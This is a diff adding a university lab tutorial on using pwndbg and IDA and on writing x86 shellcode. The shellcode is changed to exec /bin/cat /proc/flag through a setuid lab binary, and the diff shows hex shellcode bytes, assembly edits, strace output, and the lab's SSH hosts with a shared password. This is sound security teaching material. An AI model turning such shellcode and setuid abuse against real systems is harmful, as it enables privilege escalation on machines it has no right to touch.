@@ -1,0 +1,320 @@
+==================================
+Lec02: Warming up (one more week!)
+==================================
+
+In this tutorial, we will learn how to write a shellcode (a payload to
+get a flag) in assembly. Before we start, let's arm yourself with two
+new tools, one for a better dynamic analysis (pwndbg) and the other for
+a better static analysis (IDA Pro).
+
+
+1. Let's modernize gdb with pwndbg
+==================================
+
+1.1. Installation
+-----------------
+
+  ref. https://github.com/pwndbg/pwndbg
+
+  $ ssh lab02@cyclonus.gtisc.gatech.edu -p 9002
+  $ ssh lab02@computron.gtisc.gatech.edu -p 9002
+  Password: lab02
+
+  $ gdb-pwndbg
+  pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
+  pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+  pwndbg>
+
+1.2. Testing
+------------
+
+  $ gdb-pwndbg tut02-shellcode/target
+  ...
+  pwndbg> start
+  Temporary breakpoint 1 at 0x80491b7: file target.c, line 10.
+
+  Temporary breakpoint 1, main () at target.c:10
+  10        if (!fgets(buf, sizeof(buf), stdin))
+  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+  --------------------------[ REGISTERS ]---------------------------
+   EAX  0xf7f7dd88 (environ) -> 0xffffcbec -> 0xffffce10 <- 0x435f534c ('LS_C')
+   EBX  0x0
+   ECX  0xffffcb50 <- 0x1
+   EDX  0xffffcb74 <- 0x0
+   EDI  0xf7f7be24 (_GLOBAL_OFFSET_TABLE_) <- sub    al, 0x8d
+   ESI  0xf7f7be24 (_GLOBAL_OFFSET_TABLE_) <- sub    al, 0x8d
+   EBP  0xffffcb38 <- 0x0
+   ESP  0xffffcb20 <- 0x1
+   EIP  0x80491b7 (main+17) <- mov    eax, dword ptr [0x804c040]
+  --------------------------[ DISASM ]-----------------------------
+   ► 0x80491b7 <main+17>    mov    eax, dword ptr [0x804c040]
+     0x80491bc <main+22>    sub    esp, 4
+     0x80491bf <main+25>    push   eax
+     0x80491c0 <main+26>    push   0x800
+     0x80491c5 <main+31>    push   buf <0x804c060>
+     0x80491ca <main+36>    call   fgets@plt <0x8049040>
+
+     0x80491cf <main+41>    add    esp, 0x10
+     0x80491d2 <main+44>    test   eax, eax
+     0x80491d4 <main+46>    jne    main+63 <0x80491e5>
+
+     0x80491d6 <main+48>    sub    esp, 8
+     0x80491d9 <main+51>    push   0x804a008
+  ------------------------[ SOURCE (CODE) ]---------------------------
+      5
+      6 char buf[2048];
+      7
+      8 int main()
+      9 {
+   ► 10   if (!fgets(buf, sizeof(buf), stdin))
+     11     err(1, "Too long input");
+     12
+     13   // a few info for debugging
+     14   printf("> length: %d\n", (int)strlen(buf));
+     15   for (int i = 0; i < strlen(buf); i += 1) {
+  -------------------------[ STACK ]--------------------------------
+  00:0000│ esp  0xffffcb20 <- 0x1
+  01:0004│      0xffffcb24 -> 0xffffcbe4 -> 0xffffcdc6 <- 0x6d6f682f ('/hom')
+  02:0008│      0xffffcb28 -> 0xffffcbec -> 0xffffce10 <- 0x435f534c ('LS_C')
+  03:000c│      0xffffcb2c -> 0x80492cb (__libc_csu_init+27) <- lea    esi, dword ptr [ebx - 0xf8]
+  04:0010│      0xffffcb30 -> 0xf7fe4150 (_dl_fini) <- push   ebp
+  05:0014│      0xffffcb34 -> 0xffffcb50 <- 0x1
+  06:0018│ ebp  0xffffcb38 <- 0x0
+  07:001c│      0xffffcb3c -> 0xf7dbdb41 (__libc_start_main+241) <- add    esp, 0x10
+  ------------------------[ BACKTRACE ]-------------------------------
+   ► f 0  80491b7 main+17
+     f 1 f7dbdb41 __libc_start_main+241
+  Breakpoint main
+  pwndbg>
+
+    To learn about new features from pwndbg, please read here:
+
+       https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md
+
+  We will introduce a few more pwndbg's features in the later labs.
+
+1.3. Useful commands
+--------------------
+
+  aslr                 Inspect or modify ASLR status
+  checksec             Prints out the binary security settings using `checksec`.
+  elfheader            Prints the section mappings contained in the ELF header.
+  hexdump              Hexdumps data at the specified address (or at $sp)
+  main                 GDBINIT compatibility alias for 'main' command.
+  nearpc               Disassemble near a specified address.
+  nextcall             Breaks at the next call instruction
+  nextjmp              Breaks at the next jump instruction
+  nextjump             Breaks at the next jump instruction
+  nextret              Breaks at next return-like instruction
+  nextsc               Breaks at the next syscall not taking branches.
+  nextsyscall          Breaks at the next syscall not taking branches.
+  pdisass              Compatibility layer for PEDA's pdisass command
+  procinfo             Display information about the running process.
+  regs                 Print out all registers and enhance the information.
+  stack                dereferences on stack data with specified count and offset.
+  search               Search memory for byte sequences, strings, pointers, and integer values
+  telescope            Recursively dereferences pointers starting at the specified address
+  vmmap                Print virtual memory map pages. Results can be filtered by providing address/module name.
+
+  Try.
+
+  pwndbg> pwndbg
+
+
+2. Better static analysis with IDA
+==================================
+
+Please download and install IDA Pro (DEMO or freeware), which supports 64-bit binaries:
+
+   https://www.hex-rays.com/products/ida/support/download_freeware.shtml
+
+IDA is one of the most favorable disassemblers used by reverse
+engineers. You can find basic concepts and tutorials here:
+
+(Tutorial: Part 1. The Basics of IDA Pro)
+http://resources.infosecinstitute.com/basics-of-ida-pro-2/
+
+   https://out7.hex-rays.com/files/idafree70_windows.exe
+   https://out7.hex-rays.com/files/idafree70_linux.run
+   https://out7.hex-rays.com/files/idafree70_mac.tgz
+
+If you feel adventurous, please go ahead and check Part 2/3/4 of
+the tutorials too.
+
+
+3. Shellcode
+============
+
+3.1. Review Makefile and shellcode.S
+------------------------------------
+
+First, you have to copy the tutorial into a writable location under
+/tmp, perhaps /tmp/[x0x0-your-secret-dir], or your local machine.
+
+  (@server)
+  $ cp -rf tut02-shellcode /tmp/[x0x0-your-secret-dir]
+  $ cd /tmp/[x0x0-your-secret-dir]
+
+  (@local)
+  $ scp -r -P 9002 lab02@computron.gtisc.gatech.edu:tut02-shellcode/ .
+  $ cd tut02-shellcode
+
+Note that there is a pre-built 'target' binary in the tutorial folder:
+
+  $ ls -al tut02-shellcode
+
+Does it look different from the other files, in terms of permissions? This
+is a special type of file that, when you invoke, you will obtain the
+privilege of the owner of the file, in this case uid == tut02-shellcode.
+
+Your task is to get the flag from the target binary by modifying the
+given shellcode to invoke "/bin/cat". Before going further, please
+take a look on these two important files.
+
+  $ cat Makefile
+  $ cat shellcode.S
+
+3.2. Let's dump a flag
+----------------------
+
+We will modify the shellcode to invoke /bin/cat with an argument /proc/flag
+so that reads the flag, as follows:
+
+  $ cat /proc/flag
+
+- Invoke '/bin/cat' instead of '/bin/sh'
+  by modifing the lines below in shellcode.S
+
+  #define STRING  "/bin/sh"
+  #define STRLEN  7
+
+  Try.
+
+  $ make test
+  bash -c '(cat shellcode.bin; echo; cat) | ./target'
+  > length: 46
+  > 0000: EB 1F 5E 89 76 09 31 C0 88 46 08 89 46 0D B0 0B
+  > 0010: 89 F3 8D 4E 09 8D 56 0D CD 80 31 DB 89 D8 40 CD
+  > 0020: 80 E8 DC FF FF FF 2F 62 69 6E 2F 63 61 74
+  hello
+  hello
+
+  1. Type "hello" and return. Do you see the echo-ed "hello" after?
+  2. Let's use "strace" to trace system calls.
+
+     $ (cat shellcode.bin; echo; cat) | strace ./target
+     ...
+     mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77b5000
+     write(1, "> length: 46\n", 13> length: 46
+     )          = 13
+     write(1, "> 0000: EB 1F 5E 89 76 09 31 C0 "..., 57> 0000: EB 1F 5E 89 76 09 31 C0 88 46 08 89 46 0D B0 0B
+     ) = 57
+     write(1, "> 0010: 89 F3 8D 4E 09 8D 56 0D "..., 57> 0010: 89 F3 8D 4E 09 8D 56 0D CD 80 31 DB 89 D8 40 CD
+     ) = 57
+     write(1, "> 0020: 80 E8 DC FF FF FF 2F 62 "..., 51> 0020: 80 E8 DC FF FF FF 2F 62 69 6E 2F 63 61 74
+     ) = 51
+     execve("/bin/cat", ["/bin/cat"], [/* 0 vars */]) = 0
+     [ Process PID=4565 runs in 64 bit mode. ]
+     ...
+
+     Do you see exeve("/bin/cat"...)?
+     You can actually specify "-e" to check a system call of your interest
+     (in this case, execve()):
+
+     $ (cat shellcode.bin; echo; cat) | strace -e execve ./target
+     execve("./target", ["./target"], [/* 20 vars */]) = 0
+     [ Process PID=4581 runs in 32 bit mode. ]
+     > length: 46
+     > 0000: EB 1F 5E 89 76 09 31 C0 88 46 08 89 46 0D B0 0B
+     > 0010: 89 F3 8D 4E 09 8D 56 0D CD 80 31 DB 89 D8 40 CD
+     > 0020: 80 E8 DC FF FF FF 2F 62 69 6E 2F 63 61 74
+     execve("/bin/cat", ["/bin/cat"], [/* 0 vars */]) = 0
+     [ Process PID=4581 runs in 64 bit mode. ]
+
+  If you are not familiar with execve(), please read "man execve" (and "man strace").
+
+- Let's modify the shellcode to accept an argument (i.e., /proc/flag).
+
+   Your string payload looks like this:
+
+       +-------------+
+       v             |
+       [/bin/cat][0][ptr ][NULL]
+                     ^     ^
+                     |     +-- envp
+                     +-- argv
+
+   NOTE. [0] is overwritten by:
+
+     mov    [STRLEN + esi],al      /* null-terminate our string */
+
+   Our plan is to make the payload as follows:
+
+
+       +----------------------------+
+       |             +--------------=-----+
+       v             v              |     |
+       [/bin/cat][0][/proc/flag][0][ptr1][ptr2][NULL]
+                                    ^           ^
+                                    |           +-- envp
+                                    +-- argv
+
+   1. Modify "/bin/cat" to "/bin/catN/proc/flag"
+
+        #define STRING  "/bin/catN/proc/flag"
+        #define STRLEN1 8
+        #define STRLEN2 19
+
+      How could you change STRLEN? Fix compilation errors! (N is a placeholder for
+      an NULL byte that we will overwrite).
+
+   2. Place a NULL after "/bin/cat" and "/proc/flag"
+
+      Modify this assembly code:
+
+        mov    [STRLEN + esi],al      /* null-terminate our string */
+
+      Then try?
+
+        $ make test
+        ...
+        execve("/bin/cat", ["/bin/cat"], [/* 0 vars */])
+
+      Does it execute /bin/cat?
+
+   3. Let's modify the "argv" array to point to "/proc/flag"!
+
+      Referring to this assembly code, how to place the address of
+      "/proc/flag" to ARGV+4.
+
+        mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
+
+     Then try?
+
+       $ make test
+       ...
+       execve("/bin/cat", ["/bin/cat", "/proc/flag"], [/* 0 vars */]) = 0
+
+     Does it execute "/bin/cat" with "/proc/flag"?
+
+
+   Tips. Using gdb-pwndbg to debug shellcode
+
+   $ gdb-pwndbg ./target
+   ; break right before executing your shellcode
+   pwndbg> br target.c:24
+   ; run and inject shellcode.bin to its stdin
+   pwndbg> run < shellcode.bin
+   ...
+
+   ; checking if your shellcode is placed correctly
+   pwndbg> pdisas buf
+   ...
+
+Once you are done, run the command below and get the true flag for submission!
+
+      $ cat shellcode.bin | /home/lec02/tut02-shellcode/target
+
+Great, now you are ready to write x86 shellcodes! In this week, we will be writing
+various kinds of shellcode (e.g., targeting x86, x86-64, or both!) and also various
+properties (e.g., ascii-only or size constraint!). Have fun and enjoy yourself this week!
